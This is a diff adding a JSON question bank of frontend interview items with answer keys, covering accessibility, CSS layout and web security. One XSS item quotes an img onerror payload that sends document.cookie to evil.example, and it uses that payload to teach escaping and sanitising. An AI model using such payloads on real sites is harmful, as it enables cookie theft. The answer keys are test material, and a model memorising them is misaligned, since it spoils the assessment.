@@ -1,0 +1,1581 @@
+[
+  {
+    "type": "mcq",
+    "section": "knowledge",
+    "format": "concept",
+    "tracks": [
+      "frontend",
+      "fullstack"
+    ],
+    "levels": [
+      "L2",
+      "L3"
+    ],
+    "language": null,
+    "secondary_skill_codes": [
+      "engineering.frontend.components_state"
+    ],
+    "bank_key": "swe.frontend.k2.div-button-keyboard",
+    "difficulty": "easy",
+    "primary_skill_code": "engineering.frontend.accessibility",
+    "prompt": "A teammate built a delete control as `<div class=\"btn\" onclick=\"removeItem()\">Delete</div>`. Keyboard users report that they cannot use it at all. What is the best fix?",
+    "explanation": "Correct (native button): a `<button>` is focusable, runs its click handler on Enter and Space, is announced as a button and supports `disabled`, all for free. Wrong (tabindex=\"0\"): the div can now be reached with Tab, but Enter and Space still do nothing and it is not announced as a button. Wrong (role=\"button\"): screen readers now announce a button, but it still cannot be focused or activated from the keyboard, so it promises something it does not do. Wrong (keyboard shortcut): hidden and hard to discover, and the control itself is still unusable from the keyboard.",
+    "expected_time_s": 45,
+    "choices": [
+      "Add a keyboard shortcut for deleting, and list that shortcut on the app's main help page",
+      "Add `tabindex=\"0\"` to the div, so that keyboard users can reach it with the Tab key",
+      "Add `role=\"button\"` to the div, so that screen readers announce it as a button",
+      "Use a native `<button type=\"button\">`, which is focusable and works with Enter and Space"
+    ],
+    "answer": {
+      "correct": 3
+    }
+  },
+  {
+    "type": "mcq",
+    "section": "knowledge",
+    "format": "concept",
+    "tracks": [
+      "frontend",
+      "fullstack"
+    ],
+    "levels": [
+      "L2",
+      "L3"
+    ],
+    "language": null,
+    "secondary_skill_codes": [],
+    "bank_key": "swe.frontend.k2.visible-text-not-label",
+    "difficulty": "easy",
+    "primary_skill_code": "engineering.frontend.accessibility",
+    "prompt": "In a checkout form, each input has a visible `<span>` with its name (\"Email\", \"Postal code\") above it, and no other markup. Screen reader users hear only \"edit text\" when they move to each field. What is the best fix?",
+    "explanation": "Correct (label with for/id): a `<label>` linked to the input gives it an accessible name that matches the visible text, so screen readers say \"Email, edit text\"; clicking the label also focuses the field, and voice-control users can say the name they see. Wrong (role=\"textbox\"): inputs already have this role; the problem is the missing name, which this does not add. Wrong (title): some browsers use it as a last-resort name, but support is inconsistent and the tooltip is invisible to keyboard and touch users, so it is not a reliable fix. Wrong (aria-hidden on the span): it hides the only text there is and still leaves the input without a name.",
+    "expected_time_s": 45,
+    "choices": [
+      "Change each `<span>` to a `<label>` whose `for` value matches the input's `id`",
+      "Add `role=\"textbox\"` to each input, so that its purpose is announced to the user",
+      "Add a `title` attribute to each input, so that the name shows as a tooltip on hover",
+      "Add `aria-hidden=\"true\"` to each `<span>`, so that the text is not read out twice"
+    ],
+    "answer": {
+      "correct": 0
+    }
+  },
+  {
+    "type": "mcq",
+    "section": "knowledge",
+    "format": "concept",
+    "tracks": [
+      "frontend",
+      "fullstack"
+    ],
+    "levels": [
+      "L3"
+    ],
+    "language": null,
+    "secondary_skill_codes": [
+      "engineering.frontend.components_state"
+    ],
+    "bank_key": "swe.frontend.k2.modal-focus-management",
+    "difficulty": "medium",
+    "primary_skill_code": "engineering.frontend.accessibility",
+    "prompt": "You are building a custom modal dialog for editing an address, without the native `<dialog>` element. Which focus behaviour is correct?",
+    "explanation": "Correct: keyboard and screen reader users must land where the new content is; keeping Tab inside the dialog stops them reaching the covered page behind it; returning focus to the button that opened it puts them back where they were. (The native `<dialog>` with `showModal()` does most of this for you.) Wrong (keep focus on the opener): the user must Tab through the whole page to find the dialog, and screen readers are not told it opened. Wrong (close button, Tab continues behind): moving focus in is right, but letting Tab escape lets users act on hidden content behind the overlay. Wrong (blur): focus falls back to the page body, so users lose their place and nothing tells them a dialog opened.",
+    "expected_time_s": 50,
+    "choices": [
+      "Keep focus on the button that opened it, so that users do not lose their place on the page",
+      "Move focus into the dialog, keep Tab inside it, and return focus to the opener on close",
+      "Move focus to the dialog's close button, and let Tab continue into the page behind it",
+      "Call `blur()` on the focused element, so screen readers start reading from the page top"
+    ],
+    "answer": {
+      "correct": 1
+    }
+  },
+  {
+    "type": "mcq",
+    "section": "knowledge",
+    "format": "concept",
+    "tracks": [
+      "frontend",
+      "fullstack"
+    ],
+    "levels": [
+      "L3"
+    ],
+    "language": null,
+    "secondary_skill_codes": [
+      "engineering.frontend.rendering"
+    ],
+    "bank_key": "swe.frontend.k2.spa-route-change-focus",
+    "difficulty": "hard",
+    "primary_skill_code": "engineering.frontend.accessibility",
+    "prompt": "In your single-page app, following a link replaces the page content without a full page load. Screen reader users say that nothing seems to happen when they follow a link, and they have to search for the new content. What is the best fix?",
+    "explanation": "Correct: a client-side route change does not trigger the browser's normal \"new page loaded\" behaviour, so the app must do it: set `document.title` and move focus to the new main heading (made focusable with `tabindex=\"-1\"`), or announce the new page title in a polite live region. Users then hear where they are and continue from the new content. Wrong (scroll to top): this only changes what sighted users see; screen reader focus stays on the old link. Wrong (assertive live region on main): it reads out the whole page on every change, including small updates, and interrupts whatever the user is doing. Wrong (role=\"navigation\" on links): that role marks a group of navigation links as a landmark; putting it on each link is invalid and announces nothing about a page change.",
+    "expected_time_s": 55,
+    "choices": [
+      "Add `aria-live=\"assertive\"` to the whole main area, so every content change is read out",
+      "Scroll the window back to the top after each route change, so the new content is in view",
+      "After each route change, update the page title and move focus to the new main heading",
+      "Add `role=\"navigation\"` to every link, so that following one is announced as a page change"
+    ],
+    "answer": {
+      "correct": 2
+    }
+  },
+  {
+    "type": "mcq",
+    "section": "knowledge",
+    "format": "concept",
+    "tracks": [
+      "frontend",
+      "fullstack"
+    ],
+    "levels": [
+      "L2",
+      "L3"
+    ],
+    "language": null,
+    "secondary_skill_codes": [],
+    "bank_key": "swe.frontend.k2.alt-text-choices",
+    "difficulty": "easy",
+    "primary_skill_code": "engineering.frontend.accessibility",
+    "prompt": "A product page has three images: a photo of the product (a red running shoe), a decorative wavy line between two sections, and a magnifying-glass icon that is the only content of the search button. Which set of `alt` values is best?",
+    "explanation": "Correct: the product photo carries information, so it is described; the decorative line gets an empty `alt` so screen readers skip it; the icon is the button's only content, so its `alt` names the action (\"Search\"), not its look. Wrong (describes the line and the magnifying glass): the decorative line adds noise, and \"Magnifying glass\" describes the picture instead of what the button does. Wrong (file name, missing alt): a file name tells the user nothing, and an image with no `alt` at all may be announced by its file name. Wrong (empty alt on the icon): the search button is left with no accessible name and is announced only as \"button\".",
+    "expected_time_s": 50,
+    "choices": [
+      "Photo: `alt=\"Red running shoe, side view\"`; line: `alt=\"\"`; icon: `alt=\"Search\"`",
+      "Photo: `alt=\"Red running shoe, side view\"`; line: `alt=\"Wavy line\"`; icon: `alt=\"Magnifying glass\"`",
+      "Photo: `alt=\"shoe-red-01.jpg\"`; line: no `alt` attribute; icon: `alt=\"Search\"`",
+      "Photo: `alt=\"Red running shoe, side view\"`; line: `alt=\"\"`; icon: `alt=\"\"`"
+    ],
+    "answer": {
+      "correct": 0
+    }
+  },
+  {
+    "type": "mcq",
+    "section": "knowledge",
+    "format": "concept",
+    "tracks": [
+      "frontend",
+      "fullstack"
+    ],
+    "levels": [
+      "L3"
+    ],
+    "language": null,
+    "secondary_skill_codes": [],
+    "bank_key": "swe.frontend.k2.aria-hidden-focusable",
+    "difficulty": "medium",
+    "primary_skill_code": "engineering.frontend.accessibility",
+    "prompt": "Which of these uses of ARIA makes a page harder to use with a screen reader?",
+    "explanation": "Correct: `aria-hidden` removes the sidebar from what screen readers see, but not from the Tab order, so keyboard focus lands on links that are announced as nothing or as blank. Hidden content should also be removed from the Tab order (for example with the `inert` attribute). Wrong (aria-label=\"Close\"): this gives an icon-only button the name it needs. Wrong (aria-expanded): this tells users whether the menu is open, which is exactly what it is for. Wrong (aria-describedby): this makes the hint text be read after the field's name, which helps users.",
+    "expected_time_s": 50,
+    "choices": [
+      "`aria-expanded` on a menu button, set to true or false as the menu opens and closes",
+      "`aria-label=\"Close\"` on a button whose only content is an × icon",
+      "`aria-hidden=\"true\"` on a sidebar that still contains links you can reach with Tab",
+      "`aria-describedby` on an input, pointing at the hint text \"At least 8 characters\""
+    ],
+    "answer": {
+      "correct": 2
+    }
+  },
+  {
+    "type": "mcq",
+    "section": "knowledge",
+    "format": "concept",
+    "tracks": [
+      "frontend",
+      "fullstack"
+    ],
+    "levels": [
+      "L3"
+    ],
+    "language": null,
+    "secondary_skill_codes": [
+      "engineering.frontend.css_layout"
+    ],
+    "bank_key": "swe.frontend.k2.text-contrast-aa",
+    "difficulty": "easy",
+    "primary_skill_code": "engineering.frontend.accessibility",
+    "prompt": "A design uses grey body text at a normal size of 16px on a white background. Its contrast ratio is 3.2:1. A teammate says this passes WCAG 2 level AA. Which statement is correct?",
+    "explanation": "Correct: WCAG 2 level AA asks for at least 4.5:1 for normal-size text, and 3:1 for large text (about 24px, or about 18.7px bold) and for the edges of controls and icons. 3.2:1 body text at 16px fails. Wrong (3:1 for all text): that is the large-text and non-text minimum, not the body-text one. Wrong (high-contrast mode): the page itself must meet the ratio; a user setting does not make the design pass. Wrong (7:1): that is the stricter AAA level, not AA.",
+    "expected_time_s": 45,
+    "choices": [
+      "It passes, because WCAG level AA asks for a ratio of 3:1 for all of the text on a page",
+      "It fails, because normal-size text needs at least 4.5:1; 3:1 is only enough for large text",
+      "It passes, as long as users can switch their browser or system to a high-contrast mode",
+      "It fails, because WCAG level AA asks for 7:1 for body text, and 4.5:1 only for the headings"
+    ],
+    "answer": {
+      "correct": 1
+    }
+  },
+  {
+    "type": "mcq",
+    "section": "knowledge",
+    "format": "concept",
+    "tracks": [
+      "frontend",
+      "fullstack"
+    ],
+    "levels": [
+      "L3",
+      "L4"
+    ],
+    "language": null,
+    "secondary_skill_codes": [
+      "engineering.frontend.rendering"
+    ],
+    "bank_key": "swe.frontend.k2.live-region-status",
+    "difficulty": "hard",
+    "primary_skill_code": "engineering.frontend.accessibility",
+    "prompt": "When a user clicks \"Add to basket\", a small message \"Added to basket\" appears near the button for three seconds. Focus stays on the button. Screen reader users hear nothing. Which approach announces the message reliably without interrupting the user?",
+    "explanation": "Correct: screen readers announce changes to a live region they already know about. An empty `role=\"status\"` region (which is polite) present from page load, whose text is then set, is announced after the user's current speech, without moving focus. Wrong (insert a new live region with the text): many screen readers do not announce a region that is added at the same moment as its content, because it was not registered before the change. Wrong (alert()): it does get read, but it is a blocking dialog that every user must dismiss, far too disruptive for a confirmation. Wrong (moving focus): it pulls keyboard users away from where they were working, and the message disappears after three seconds, leaving focus on nothing.",
+    "expected_time_s": 60,
+    "choices": [
+      "Move focus to the message when it appears, and move focus back to the button afterwards",
+      "Insert a new element with `aria-live=\"polite\"` and the message in it at the moment of the click",
+      "Show the message with the browser's `alert()` dialog, so that every screen reader reads it",
+      "Keep an empty `role=\"status\"` element in the page from the start, and put the text into it"
+    ],
+    "answer": {
+      "correct": 3
+    }
+  },
+  {
+    "type": "multi_select",
+    "section": "knowledge",
+    "format": "concept",
+    "tracks": [
+      "frontend",
+      "fullstack"
+    ],
+    "levels": [
+      "L3"
+    ],
+    "language": null,
+    "secondary_skill_codes": [
+      "engineering.frontend.css_layout"
+    ],
+    "bank_key": "swe.frontend.k2.keyboard-access-breakers",
+    "difficulty": "medium",
+    "primary_skill_code": "engineering.frontend.accessibility",
+    "prompt": "You are reviewing a pull request for a new navigation bar. Which of these changes make the page harder or impossible to use with a keyboard alone? Select all that apply.",
+    "choices": [
+      "`:focus { outline: none; }` on all links, with no other focus style to replace it",
+      "Plain `<a href>` elements for links that go to other pages of the site",
+      "A submenu that opens only on mouse hover, with no way to open it from the keyboard",
+      "`tabindex=\"3\"`, `\"1\"` and `\"2\"` on the first, second and third links, to set a custom Tab order",
+      "A focus ring styled with `:focus-visible`, so it shows for keyboard users only"
+    ],
+    "explanation": "Correct (outline: none with no replacement): keyboard users can no longer see where focus is. Correct (hover-only submenu): its links cannot be reached without a mouse. Correct (positive tabindex): Tab now visits the second, third and then first link, and all three before anything else on the page (a skip link or the logo included), so focus no longer follows the visual order; it also breaks as the page changes. DOM order should set the Tab order (WCAG 2.4.3; axe flags any tabindex above 0). Wrong (plain <a href>): native links are focusable and work with Enter, which is exactly right for navigation. Wrong (:focus-visible): it still shows a focus ring when the keyboard is used, and only hides it for mouse clicks.",
+    "expected_time_s": 60,
+    "answer": {
+      "correct": [
+        0,
+        2,
+        3
+      ]
+    }
+  },
+  {
+    "type": "multi_select",
+    "section": "knowledge",
+    "format": "concept",
+    "tracks": [
+      "frontend",
+      "fullstack"
+    ],
+    "levels": [
+      "L3"
+    ],
+    "language": null,
+    "secondary_skill_codes": [],
+    "bank_key": "swe.frontend.k2.form-error-accessibility",
+    "difficulty": "medium",
+    "primary_skill_code": "engineering.frontend.accessibility",
+    "prompt": "A sign-up form shows validation errors after the user presses Submit. Which practices make the errors usable for screen reader users and for people who cannot tell red from green? Select all that apply.",
+    "choices": [
+      "Show only a red border on each invalid field, so that the form's layout stays clean",
+      "Show an error text next to each invalid field, and link it with `aria-describedby`",
+      "Show the error message in a tooltip that appears when the mouse is over the field",
+      "After a failed submit, move focus to the first invalid field or to an error summary",
+      "Put the error message in the field's placeholder text, so that it is inside the field",
+      "Set `aria-invalid=\"true\"` on each invalid field, and remove it once it is fixed"
+    ],
+    "explanation": "Correct (visible text linked with aria-describedby): the error does not rely on colour, and screen readers read it with the field. Correct (move focus after a failed submit): users are taken straight to the problem instead of having to search for it. Correct (aria-invalid): screen readers announce the field as invalid. Wrong (red border only): colour alone is invisible to many colour-blind users and says nothing to screen readers. Wrong (hover tooltip): keyboard, touch and screen reader users never trigger it. Wrong (placeholder): it disappears as soon as the user types, has weak contrast, and is not reliably announced as an error.",
+    "expected_time_s": 60,
+    "answer": {
+      "correct": [
+        1,
+        3,
+        5
+      ]
+    }
+  },
+  {
+    "type": "mcq",
+    "section": "knowledge",
+    "format": "concept",
+    "tracks": [
+      "frontend",
+      "fullstack"
+    ],
+    "levels": [
+      "L2",
+      "L3"
+    ],
+    "language": null,
+    "secondary_skill_codes": [],
+    "bank_key": "swe.frontend.k2.grid-for-card-gallery",
+    "difficulty": "easy",
+    "primary_skill_code": "engineering.frontend.css_layout",
+    "prompt": "You need a gallery of product cards that fills as many equal-width columns as fit the screen. Cards must line up in neat rows and columns, including on the last, partly filled row. Which approach fits best?",
+    "explanation": "Correct (Grid with auto-fill and minmax): Grid controls rows and columns together, so every card shares the same column tracks; `auto-fill` with `minmax` picks as many columns as fit, and cards on the last row keep the same width. Wrong (Flexbox with flex: 1): each wrapped line shares out its own space, so the cards on a partly filled last row stretch wider than the others and break the columns. Wrong (floats): always four columns whatever the screen size, plus old clearing hacks. Wrong (table): the cards are not tabular data, so the markup is wrong for screen readers, and it does not reflow on small screens.",
+    "expected_time_s": 45,
+    "choices": [
+      "CSS Grid with `grid-template-columns: repeat(auto-fill, minmax(220px, 1fr))`",
+      "Flexbox with `flex-wrap: wrap` and `flex: 1` on each card, so cards stretch to fill rows",
+      "Floats with `width: 25%` on each card, and a clearfix on the gallery container",
+      "An HTML `<table>` with four columns that scrolls sideways on narrow screens"
+    ],
+    "answer": {
+      "correct": 0
+    }
+  },
+  {
+    "type": "mcq",
+    "section": "knowledge",
+    "format": "concept",
+    "tracks": [
+      "frontend",
+      "fullstack"
+    ],
+    "levels": [
+      "L3"
+    ],
+    "language": null,
+    "secondary_skill_codes": [],
+    "bank_key": "swe.frontend.k2.specificity-beats-order",
+    "difficulty": "medium",
+    "primary_skill_code": "engineering.frontend.css_layout",
+    "prompt": "A UI library's stylesheet contains `#app .nav a { color: blue; }`. Your own stylesheet loads after it and contains `.button { color: white; }`. A link `<a class=\"button\">` inside the nav is still blue. Why?",
+    "explanation": "Correct: `#app .nav a` has one id, one class and one element, which beats a single class. Source order only decides between rules of equal specificity. Fixes include matching or raising the specificity, putting the library in a lower `@layer`, or avoiding ids in selectors. Wrong (third-party always wins): both files are ordinary page stylesheets; neither gets priority for where it came from. Wrong (duplicate skipped): a later rule is never ignored; at equal specificity it would win. Wrong (only :link): page styles on `a` elements work fine; `:link` just matches links that have not been visited.",
+    "expected_time_s": 50,
+    "choices": [
+      "Link colours are set by the browser, and they can only be changed with the `:link` selector",
+      "Rules from third-party stylesheets always win over your own rules unless you use `!important`",
+      "Your rule loads later, so the browser treats it as a duplicate of the earlier rule and skips it",
+      "The library selector contains an id, so it is more specific and wins although it comes first"
+    ],
+    "answer": {
+      "correct": 3
+    }
+  },
+  {
+    "type": "mcq",
+    "section": "knowledge",
+    "format": "concept",
+    "tracks": [
+      "frontend",
+      "fullstack"
+    ],
+    "levels": [
+      "L3",
+      "L4"
+    ],
+    "language": null,
+    "secondary_skill_codes": [],
+    "bank_key": "swe.frontend.k2.stacking-context-transform",
+    "difficulty": "hard",
+    "primary_skill_code": "engineering.frontend.css_layout",
+    "prompt": "A dropdown menu has `position: absolute; z-index: 9999`, but it appears behind the page header, which has `position: sticky; z-index: 10`. The dropdown sits inside a card that has `transform: translateY(0)` (left over from an animation) and no z-index. What is the cause?",
+    "explanation": "Correct: a transform (like opacity below 1, `filter`, or a positioned element with a z-index) makes the card a stacking context. The dropdown's 9999 is only compared with things inside the card; the card as a whole is painted at level 0, below the header's 10. Fixes: remove the leftover transform, give the card a stacking order above the header, or render the dropdown outside the card (a portal). Wrong (no effect on absolute): z-index works on any positioned element, absolute included. Wrong (sticky always on top): sticky elements follow the same z-index rules as other positioned elements. Wrong (same parent): elements anywhere in the same stacking context can be ordered; the real limit is the stacking context, not the parent.",
+    "expected_time_s": 60,
+    "choices": [
+      "The card's `transform` creates a new stacking context, so 9999 only counts inside the card",
+      "`z-index` has no effect on elements with `position: absolute`, only on ones that are `relative`",
+      "Sticky elements are always painted above absolute ones, whatever their z-index is",
+      "`z-index` only works between elements that share the same direct parent element"
+    ],
+    "answer": {
+      "correct": 0
+    }
+  },
+  {
+    "type": "mcq",
+    "section": "knowledge",
+    "format": "concept",
+    "tracks": [
+      "frontend",
+      "fullstack"
+    ],
+    "levels": [
+      "L3"
+    ],
+    "language": null,
+    "secondary_skill_codes": [
+      "engineering.frontend.components_state"
+    ],
+    "bank_key": "swe.frontend.k2.container-query-component",
+    "difficulty": "hard",
+    "primary_skill_code": "engineering.frontend.css_layout",
+    "prompt": "A product card component appears both in a wide main column and in a narrow sidebar on the same page. It should stack its image above its text whenever the card itself is narrower than 400px. Which approach fits best?",
+    "explanation": "Correct: a container query (with `container-type: inline-size` on the wrapper) reacts to the space the card actually has, so the same component stacks in the sidebar and stays side by side in the main column. Wrong (media query): it tests the viewport width; on a wide screen the sidebar card is narrow but the query never matches. Wrong (vw units): they also follow the viewport, not the card. Wrong (window resize listener): it also only knows the window size, adds JavaScript work on every resize, and does not run when the column changes width for other reasons (for example a sidebar being opened).",
+    "expected_time_s": 50,
+    "choices": [
+      "Image and text widths in `vw` units, so that they shrink with the browser window",
+      "A media query such as `@media (max-width: 400px)` around the stacked layout rules",
+      "A container query on the card's wrapper, such as `@container (max-width: 400px)`",
+      "A listener on the window's `resize` event that adds a class to every card on the page"
+    ],
+    "answer": {
+      "correct": 2
+    }
+  },
+  {
+    "type": "mcq",
+    "section": "knowledge",
+    "format": "concept",
+    "tracks": [
+      "frontend",
+      "fullstack"
+    ],
+    "levels": [
+      "L2",
+      "L3"
+    ],
+    "language": null,
+    "secondary_skill_codes": [],
+    "bank_key": "swe.frontend.k2.box-sizing-width",
+    "difficulty": "easy",
+    "primary_skill_code": "engineering.frontend.css_layout",
+    "prompt": "An element has `width: 300px; padding: 20px; border: 2px solid gray;` and no `box-sizing` rule, so the browser default applies. It overflows its 300px-wide column. How wide is it on screen?",
+    "explanation": "Correct (344px): the default `box-sizing: content-box` applies `width` to the content only, then adds padding and border on both sides: 300 + 2 × 20 + 2 × 2 = 344. With `box-sizing: border-box` it would be exactly 300px, which is why many projects set it globally. Wrong (300px): that is the border-box result. Wrong (322px): adds the padding and border for one side only. Wrong (340px): adds the padding but forgets the border.",
+    "expected_time_s": 40,
+    "choices": [
+      "340px",
+      "300px",
+      "322px",
+      "344px"
+    ],
+    "answer": {
+      "correct": 3
+    }
+  },
+  {
+    "type": "mcq",
+    "section": "knowledge",
+    "format": "concept",
+    "tracks": [
+      "frontend",
+      "fullstack"
+    ],
+    "levels": [
+      "L3"
+    ],
+    "language": null,
+    "secondary_skill_codes": [
+      "engineering.debugging.hypothesis"
+    ],
+    "bank_key": "swe.frontend.k2.sticky-overflow-ancestor",
+    "difficulty": "hard",
+    "primary_skill_code": "engineering.frontend.css_layout",
+    "prompt": "You add `position: sticky; top: 0;` to a table's header row so that it stays visible while the page scrolls. Instead, it scrolls away with the rest of the table. Which cause is most likely?",
+    "explanation": "Correct: a sticky element sticks to its nearest ancestor that has an `overflow` other than `visible`. A common case is a wrapper with `overflow-x: auto` for wide tables; that wrapper does not scroll vertically itself, so the header never sticks to the page. Fix it by removing that overflow, or by making the wrapper the vertical scroll area (with a height limit). Wrong (z-index): z-index only decides what paints on top; it does not turn sticking on. Wrong (parent needs position: relative): sticky does not need a positioned parent; that rule belongs to `position: absolute`. Wrong (fixed height): sticky has no height requirement.",
+    "expected_time_s": 50,
+    "choices": [
+      "A parent has `overflow: hidden` or `auto`, so the header sticks only within that box",
+      "Sticky positioning only works when the element also has a `z-index` value set",
+      "Sticky positioning only works when the parent element has `position: relative` set",
+      "Sticky positioning only works on elements that have a fixed height set in pixels"
+    ],
+    "answer": {
+      "correct": 0
+    }
+  },
+  {
+    "type": "mcq",
+    "section": "knowledge",
+    "format": "concept",
+    "tracks": [
+      "frontend",
+      "fullstack"
+    ],
+    "levels": [
+      "L3"
+    ],
+    "language": null,
+    "secondary_skill_codes": [
+      "engineering.frontend.rendering"
+    ],
+    "bank_key": "swe.frontend.k2.animate-transform-not-layout",
+    "difficulty": "medium",
+    "primary_skill_code": "engineering.frontend.css_layout",
+    "prompt": "A notification slides in at the top of the page by animating its `margin-top` from -60px to 0. While it animates, the content below is pushed down, the page records layout shifts, and the animation stutters on low-end phones. What is the best fix?",
+    "explanation": "Correct: with `position: fixed` the notification no longer takes up space, so nothing else moves, and a `transform` is applied after layout, without recalculating it, so the animation is smooth and is not counted as a layout shift. Wrong (will-change: margin-top): a margin change still needs a new layout on every frame and still pushes the content. Wrong (setInterval every 16 ms): still a layout on every step, and timers are not in step with the screen's frames, so it stutters more. Wrong (animate a spacer's height): the content below still moves on every frame, which is the same shift.",
+    "expected_time_s": 55,
+    "choices": [
+      "Add `will-change: margin-top`, so that the browser can prepare the margin animation in advance",
+      "Take it out of the page flow with `position: fixed`, and animate `transform: translateY()` instead",
+      "Animate `margin-top` from JavaScript with `setInterval` every 16 ms, for smaller and smoother steps",
+      "Animate the `height` of an empty spacer above the content instead, so the notification stays still"
+    ],
+    "answer": {
+      "correct": 1
+    }
+  },
+  {
+    "type": "mcq",
+    "section": "knowledge",
+    "format": "concept",
+    "tracks": [
+      "frontend",
+      "fullstack"
+    ],
+    "levels": [
+      "L3"
+    ],
+    "language": null,
+    "secondary_skill_codes": [],
+    "bank_key": "swe.frontend.k2.mobile-viewport-height",
+    "difficulty": "medium",
+    "primary_skill_code": "engineering.frontend.css_layout",
+    "prompt": "A full-screen mobile menu uses `height: 100vh`. On phones, the buttons at the bottom of the menu are hidden behind the browser's address bar and toolbar. What is the best fix?",
+    "explanation": "Correct: on mobile browsers `vh` is based on the largest viewport (with the browser bars hidden), so `100vh` is taller than the visible area while the bars show. `dvh` (dynamic viewport height) follows the area that is actually visible; `svh` uses the smallest. Wrong (100vw): it is based on the width, which has nothing to do with the bars. Wrong (100% without parent heights): a percentage height needs a parent with a set height, otherwise it behaves like `auto`. Wrong (overflow: hidden on body): it stops the page scrolling, but the menu is still taller than the visible area, so its bottom buttons stay out of reach.",
+    "expected_time_s": 50,
+    "choices": [
+      "Use `height: 100vw`, so that the height is taken from the width of the phone's screen instead",
+      "Use `height: 100dvh`, which follows the visible area as the browser bars appear and hide",
+      "Use `height: 100%` on the menu, without setting any height on its parent elements",
+      "Add `overflow: hidden` to the body, so that the page behind the menu cannot scroll"
+    ],
+    "answer": {
+      "correct": 1
+    }
+  },
+  {
+    "type": "multi_select",
+    "section": "knowledge",
+    "format": "concept",
+    "tracks": [
+      "frontend",
+      "fullstack"
+    ],
+    "levels": [
+      "L3",
+      "L4"
+    ],
+    "language": null,
+    "secondary_skill_codes": [],
+    "bank_key": "swe.frontend.k2.flex-item-min-width",
+    "difficulty": "hard",
+    "primary_skill_code": "engineering.frontend.css_layout",
+    "prompt": "A flex row has a text column with `flex: 1` and a fixed-width Delete button. When the text column shows a long file name with no spaces, the column will not shrink, the content overflows the screen and the button is pushed out of view. Which changes fix this? Select all that apply.",
+    "choices": [
+      "Set `flex-shrink: 1` on the text column, so that it is allowed to become narrower",
+      "Set `min-width: 0` on the text column, and add `overflow-wrap: anywhere` to the name",
+      "Give the Delete button a higher `z-index`, so that it is painted on top of the text",
+      "Set `overflow: hidden` and `text-overflow: ellipsis` on the text column",
+      "Set `width: 100%` on the flex container, so its content cannot be wider than the screen"
+    ],
+    "explanation": "Background: a flex item has `min-width: auto` by default, so it will not shrink below its content's minimum width, here the whole unbroken file name. Correct (min-width: 0 plus overflow-wrap: anywhere): the column may now shrink, and the long name breaks onto several lines inside it. Correct (overflow: hidden with an ellipsis): an item whose overflow is not `visible` gets a minimum width of 0, so it shrinks and the name is cut off with \"…\". Wrong (flex-shrink: 1): `flex: 1` already sets it; the minimum width is what stops the shrinking. Wrong (z-index): the button is outside the visible area, and painting order cannot bring it back. Wrong (width: 100% on the container): the container is already as wide as its parent; the item overflows the container, it does not make the container grow.",
+    "expected_time_s": 70,
+    "answer": {
+      "correct": [
+        1,
+        3
+      ]
+    }
+  },
+  {
+    "type": "multi_select",
+    "section": "knowledge",
+    "format": "concept",
+    "tracks": [
+      "frontend",
+      "fullstack"
+    ],
+    "levels": [
+      "L3"
+    ],
+    "language": null,
+    "secondary_skill_codes": [
+      "engineering.frontend.accessibility"
+    ],
+    "bank_key": "swe.frontend.k2.font-size-user-setting",
+    "difficulty": "medium",
+    "primary_skill_code": "engineering.frontend.css_layout",
+    "prompt": "A user with low vision changes their browser's default font size from 16px to 24px (in the browser settings, not with page zoom). Which `font-size` values for your body text will grow with this setting? Select all that apply.",
+    "choices": [
+      "`16px` on the body text",
+      "`2vw` on the body text",
+      "`1rem` on the body text",
+      "`calc(12px + 0.5vw)` on the body text",
+      "`112.5%` on the `html` element, with body text inheriting it"
+    ],
+    "explanation": "Correct (1rem): rem is relative to the root font size, which starts at the user's chosen default, so 1rem becomes 24px. Correct (112.5% on html): a percentage on the root scales the user's default, giving 27px, and everything sized in rem or em follows. Wrong (16px): a pixel value ignores the default font size setting (only page zoom scales it). Wrong (2vw): it follows the window width, not the user's font setting. Wrong (calc(12px + 0.5vw)): made only of pixels and viewport units, so the setting has no effect on it.",
+    "expected_time_s": 55,
+    "answer": {
+      "correct": [
+        2,
+        4
+      ]
+    }
+  },
+  {
+    "type": "mcq",
+    "section": "knowledge",
+    "format": "concept",
+    "tracks": [
+      "frontend",
+      "fullstack"
+    ],
+    "levels": [
+      "L3"
+    ],
+    "language": null,
+    "secondary_skill_codes": [
+      "engineering.frontend.rendering"
+    ],
+    "bank_key": "swe.frontend.k2.raw-html-xss",
+    "difficulty": "medium",
+    "primary_skill_code": "engineering.security.injection",
+    "prompt": "A comments component renders each comment as raw HTML (with React's `dangerouslySetInnerHTML`, or `v-html` in Vue) so that line breaks and links display nicely. A tester posts the comment below, and it runs in the browser of every visitor who opens the page:\n\n```html\n<img src=x onerror=\"fetch('https://evil.example/?c=' + document.cookie)\">\n```\n\nWhat is the best fix?",
+    "explanation": "Correct: rendering the comment as text lets the framework escape it, so markup is shown, not run. If some formatting is needed, an allow-list sanitiser such as DOMPurify removes event handlers, `javascript:` links and other dangerous markup. Wrong (strip <script> with a regex): this payload has no script tag at all; event-handler attributes, SVG and many encodings get past home-made filters. Wrong (browser-side check): an attacker sends the comment straight to the API and skips your form entirely. Wrong (Secure flag): it only stops the cookie being sent over plain HTTP; scripts can still read it (that is what HttpOnly prevents), and injected script can do anything the user can do anyway.",
+    "expected_time_s": 55,
+    "choices": [
+      "Remove every `<script>` tag from each comment with a regular expression before it is rendered",
+      "Render the comment as plain text, or clean the HTML with a proven sanitiser such as DOMPurify",
+      "Check in the browser that the comment contains no `<` character before it is submitted",
+      "Set the `Secure` flag on all cookies, so that `document.cookie` cannot be sent elsewhere"
+    ],
+    "answer": {
+      "correct": 1
+    }
+  },
+  {
+    "type": "mcq",
+    "section": "knowledge",
+    "format": "concept",
+    "tracks": [
+      "frontend",
+      "fullstack"
+    ],
+    "levels": [
+      "L3",
+      "L4"
+    ],
+    "language": null,
+    "secondary_skill_codes": [
+      "engineering.frontend.browser_network"
+    ],
+    "bank_key": "swe.frontend.k2.csp-limits-xss",
+    "difficulty": "hard",
+    "primary_skill_code": "engineering.security.injection",
+    "prompt": "Your site sends the header `Content-Security-Policy: script-src 'self'`. An attacker finds a bug that lets them inject `<script>alert(1)</script>` or an `onerror=\"...\"` attribute into one of your pages. What does the header do?",
+    "explanation": "Correct: CSP is enforced by the browser. `script-src 'self'` (without `'unsafe-inline'`) blocks inline `<script>` blocks, inline event-handler attributes and scripts loaded from other hosts, so this payload does not run. It is a second line of defence: the injection bug still has to be fixed, because injected HTML can still change the page and a script hosted on your own origin would still be allowed. Wrong (server strips HTML): CSP does not change response bodies; it only tells the browser what it may load and run. Wrong (iframes): that is the `frame-ancestors` directive, which protects against clickjacking. Wrong (blocks other origins calling your API): that confuses CSP with CORS; `script-src` says nothing about who may call your API.",
+    "expected_time_s": 60,
+    "choices": [
+      "The web server strips the injected HTML out of every response before it is sent to users",
